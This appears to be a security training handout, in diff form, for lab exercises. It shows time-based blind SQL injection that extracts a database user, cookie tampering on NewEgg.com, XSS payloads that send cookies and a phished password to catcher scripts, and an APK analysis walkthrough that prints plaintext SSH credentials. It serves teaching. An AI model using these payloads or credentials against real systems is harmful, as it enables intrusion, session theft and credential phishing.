+Time-Based BLIND SQL INJECTION - EXTRACT DATABASE USER
+   
+3 - Total Characters
+---------------------------Type This-----------------------------------
+ 
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--      (Ok, the username is 3 chars long - it waited 10 seconds)
+-----------------------------------------------------------------------
+ 
+Let's go for a quick check to see if it's DBO
+ 
+---------------------------Type This-----------------------------------
+ 
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2; IF ((USER)='dbo') WAITFOR DELAY '00:00:10'--
+-----------------------------------------------------------------------
+ 
+Yup, it waited 10 seconds so we know the username is 'dbo' - let's give you the syntax to verify it just for fun.
+ 
+---------------------------Type This-----------------------------------
+ 
+D  - 1st Character
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--  
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'--  (Ok, first letter is a 100 which is the letter 'd' - it waited 10 seconds)
+ 
+B - 2nd Character
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+ 
+O - 3rd Character
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>97) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>115) WAITFOR DELAY '00:00:10'--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>105) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>110) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=110) WAITFOR DELAY '00:00:10'--      
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=111) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+################################
+# Playing with session cookies #
+################################
+ 
+-----------------------------------------------------------------------
+Step 1: Browse to the shopping cart page NewEgg.com
+-------------------Browse to this webpage in Firefox------------------------------
+https://secure.newegg.com/Shopping/ShoppingCart.aspx?Submit=view
+----------------------------------------------------------------------------------
+ 
+ 
+ 
+Step 2: View the current session ID
+---Type this over the shopping car URL in the address bar (don't paste it )---------
+javascript:void(document.write(document.cookie))
+------------------------------------------------------------------------------------
+ 
+You should see your session cookie and if you don't try again in a different browser
+ 
+ 
+ 
+Step 3: Go back to the shopping cart page (click the back button)
+---------------------------------------------------------------------------------
+https://secure.newegg.com/Shopping/ShoppingCart.aspx?Submit=view
+---------------------------------------------------------------------------------
+ 
+ 
+Step 4: Now let's modify the session ID
+---Type this over the shopping car URL in the address bar (don't paste it )---------
+javascript:void(document.cookie="PHPSessionID=wow-this-is-fun")
+------------------------------------------------------------------------------------
+ 
+ 
+ 
+Step 5: Go back to the shopping cart page (click the back button)
+---------------------------------------------------------------------------------
+https://secure.newegg.com/Shopping/ShoppingCart.aspx?Submit=view
+---------------------------------------------------------------------------------
+ 
+ 
+ 
+Step 6: View the current session ID
+---Type this over the shopping car URL in the address bar (don't paste it )---------
+javascript:void(document.write(document.cookie))
+------------------------------------------------------------------------------------
+ 
+-----------------------------------------------------------------------
+ 
+#########################################################
+# What is XSS                                           #
+# https://phpapp.infosecaddicts.com/2-Intro_To_XSS.pptx #
+#########################################################
+ 
+OK - what is Cross Site Scripting (XSS)
+ 
+1. Use Firefox to browse to the following location:
+---------------------------Type This-----------------------------------
+ 
+   https://phpapp.infosecaddicts.com/xss_practice/
+-----------------------------------------------------------------------
+ 
+   A really simple search page that is vulnerable should come up.
+ 
+ 
+ 
+ 
+2. In the search box type:
+---------------------------Type This-----------------------------------
+ 
+   <script>alert('So this is XSS')</script>
+-----------------------------------------------------------------------
+ 
+ 
+   This should pop-up an alert window with your message in it proving XSS is in fact possible.
+   Ok, click OK and then click back and go back to https://phpapp.infosecaddicts.com/xss_practice/
+ 
+ 
+3. In the search box type:
+---------------------------Type This-----------------------------------
+ 
+   <script>alert(document.cookie)</script>
+-----------------------------------------------------------------------
+ 
+ 
+   This should pop-up an alert window with your message in it proving XSS is in fact possible and your cookie can be accessed.
+   Ok, click OK and then click back and go back to https://phpapp.infosecaddicts.com/xss_practice/
+ 
+4. Now replace that alert script with:
+---------------------------Type This-----------------------------------
+ 
+   <script>document.location="https://phpapp.infosecaddicts.com/xss_practice/cookie_catcher.php?c="+document.cookie</script>
+-----------------------------------------------------------------------
+ 
+ 
+This will actually pass your cookie to the cookie catcher that we have sitting on the webserver.
+ 
+ 
+5. Now view the stolen cookie at:
+---------------------------Type This-----------------------------------
+ 
+   https://phpapp.infosecaddicts.com/xss_practice/cookie_stealer_logs.html
+-----------------------------------------------------------------------
+ 
+ 
+The cookie catcher writes to this file and all we have to do is make sure that it has permissions to be written to.
+ 
+ 
+ 
+ 
+ 
+ 
+############################
+# A Better Way To Demo XSS #
+############################
+ 
+ 
+Let's take this to the next level. We can modify this attack to include some username/password collection. Paste all of this into the search box.
+ 
+ 
+Use Firefox to browse to the following location:
+---------------------------Type This-----------------------------------
+ 
+ https://phpapp.infosecaddicts.com/xss_practice/
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Paste this in the search box
+----------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+<script>
+password=prompt('Your session is expired. Please enter your password to continue',' ');
+document.write("<img src=\"https://phpapp.infosecaddicts.com/xss_practice/passwordgrabber.php?password=" +password+"\">");
+</script>
+-----------------------------------------------------------------------
+ 
+ 
+Now view the stolen cookie at:
+---------------------------Type This-----------------------------------
+ 
+ https://phpapp.infosecaddicts.com/xss_practice/passwords.html
+ 
+-----------------------------------------------------------------------
+
+
+
+###########################
+# Mobile Malware Analysis #
+##########################
+sudo apt install -y androguard android-platform-tools-base apktool split-select google-android-build-tools-installer
+
+Open IDLE, and let's just dive right in.
+ 
+ 
+- I prefer to use Putty to SSH into my Linux host.
+- You can download Putty from here:
+- http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+ 
+Here is the information to put into putty
+ 
+Host Name:          107.191.39.106
+protocol:           ssh
+port:               22
+username:           sempra
+password:           semprapython3!
+
+
+
+
+What is an APK?
+An Android application is packaged as an APK ( Android Package ) file, which is essentially a ZIP file containing the compiled code, the resources, signature, manifest and every other file the software needs in order to run. Being it a ZIP file, we can start looking at its contents using the unzip command line utility ( or any other unarchiver you use ):
+
+---------------------------Type This-----------------------------------
+cd android_malware
+unzip application.apk -d yourname
+-----------------------------------------------------------------------
+
+Here’s what you will find inside an APK.
+
+---------------------------Type This-----------------------------------
+cd yourname
+ls
+-----------------------------------------------------------------------
+
+- AndroidManifest.xml (file)
+This is the binary representation of the XML manifest file describing what permissions the application will request (keep in mind that some of the permissions might be requested at runtime by the app and not declared here), what activities ( GUIs ) are in there, what services ( stuff running in the background with no UI ) and what receivers ( classes that can receive and handle system events such as the device boot or an incoming SMS ).
+
+Once decompiled (more on this later), it’ll look like this:
+
+<?xml version="1.0" encoding="utf-8" standalone="no"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.company.appname" 
+                                                                     platformBuildVersionCode="24" 
+                                                                     platformBuildVersionName="7.0">
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+
+    <application android:allowBackup="true" android:icon="@mipmap/ic_launcher" 
+        android:label="@string/app_name" 
+        android:supportsRtl="true" android:theme="@style/AppTheme">
+        <activity android:name="com.company.appname.MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+    </application>
+    
+</manifest>
+Keep in mind that this is the perfect starting point to isolate the application “entry points”, namely the classes you’ll reverse first in order to understand the logic of the whole software. In this case for instance, we would start inspecting the com.company.appname.MainActivity class being it declared as the main UI for the application.
+
+
+---------------------------Type This-----------------------------------
+cd assets
+ls
+-----------------------------------------------------------------------
+- assets/* ( folder )
+This folder will contain application specific files, like wav files the app might need to play, custom fonts and so on. Reversing-wise it’s usually not very important, unless of course you find inside the software functional references to such files.
+
+
+---------------------------Type This-----------------------------------
+cd ../res
+ls
+-----------------------------------------------------------------------
+
+
+- res/* ( folder )
+All the resources, like the activities xml files, images and custom styles are stored here.
+
+---------------------------Type This-----------------------------------
+cd ../
+ls
+-----------------------------------------------------------------------
+
+
+- resources.arsc ( file )
+This is the “index” of all the resources, long story short, at each resource file is assigned a numeric identifier that the app will use in order to identify that specific entry and the resources.arsc file maps these files to their identifiers … nothing very interesting about it.
+
+- classes.dex ( file )
+This file contains the Dalvik ( the virtual machine running Android applications ) bytecode of the app, let me explain it better. An Android application is (most of the times) developed using the Java programming language. The java source files are then compiled into this bytecode which the Dalvik VM eventually will execute … pretty much what happens to normal Java programs when they’re compiled to .class files.
+
+Long story short, this file contains the logic, that’s what we’re interested into.
+
+Sometimes you’ll also find a classes2.dex file, this is due to the DEX format which has a limit to the number of classes you can declare inside a single dex file, at some point in history Android apps became bigger and bigger and so Google had to adapt this format, supporting a secondary .dex file where other classes can be declared.
+
+From our perspective it doesn’t matter, the tools we’re going to use are able to detect it and append it to the decompilation pipeline.
+
+- libs/ ( folder )
+Sometimes an app needs to execute native code, it can be an image processing library, a game engine or whatever. In such case, those .so ELF libraries will be found inside the libs folder, divided into architecture specific subfolders ( so the app will run on ARM, ARM64, x86, etc ).
+
+
+---------------------------Type This-----------------------------------
+cd META-INF/
+ls
+-----------------------------------------------------------------------
+
+
+
+- META-INF/ ( folder )
+Every Android application needs to be signed with a developer certificate in order to run on a device, even debug builds are signed by a debug certificate, the META-INF folder contains information about the files inside the APK and about the developer.
+
+Inside this folder, you’ll usually find:
+
+A MANIFEST.MF file with the SHA-1 or SHA-256 hashes of all the files inside the APK.
+A CERT.SF file, pretty much like the MANIFEST.MF, but signed with the RSA key.
+A CERT.RSA file which contains the developer public key used to sign the CERT.SF file and digests.
+Those files are very important in order to guarantee the APK integrity and the ownership of the code. Sometimes inspecting such signature can be very handy to determine who really developed a given APK. If you want to get information about the developer, you can use the openssl command line utility:
+
+---------------------------Type This-----------------------------------
+openssl pkcs7 -in CERT.RSA -inform DER -print
+-----------------------------------------------------------------------
+This will print an output like:
+
+PKCS7: 
+  type: pkcs7-signedData (1.2.840.113549.1.7.2)
+  d.sign: 
+    version: 1
+    md_algs:
+        algorithm: sha1 (1.3.14.3.2.26)
+        parameter: NULL
+    contents: 
+      type: pkcs7-data (1.2.840.113549.1.7.1)
+      d.data: <ABSENT>
+    cert:
+        cert_info: 
+          version: 2
+          serialNumber: 10394279457707717180
+          signature: 
+            algorithm: sha1WithRSAEncryption (1.2.840.113549.1.1.5)
+            parameter: NULL
+          issuer: C=TW, ST=Taiwan, L=Taipei, O=ASUS, OU=PMD, CN=ASUS AMAX Key/emailAddress=admin@asus.com
+          validity: 
+            notBefore: Jul  8 11:39:39 2013 GMT
+            notAfter: Nov 23 11:39:39 2040 GMT
+          subject: C=TW, ST=Taiwan, L=Taipei, O=ASUS, OU=PMD, CN=ASUS AMAX Key/emailAddress=admin@asus.com
+          key: 
+            algor: 
+              algorithm: rsaEncryption (1.2.840.113549.1.1.1)
+              parameter: NULL
+            public_key:  (0 unused bits)
+              ...
+              ...
+              ...
+This can be gold for us, for instance we could use this information to determine if an app was really signed by (let’s say) Google or if it was resigned, therefore modified, by a third party.
+
+---------------------------Type This-----------------------------------
+sh /home/sempra/dex2jar-2.0/d2j-dex2jar.sh classes.dex
+------------------------------------------------------
+
+
+Download via SCP the classes.dex.jar file to your local machine. Then install JD-GUI
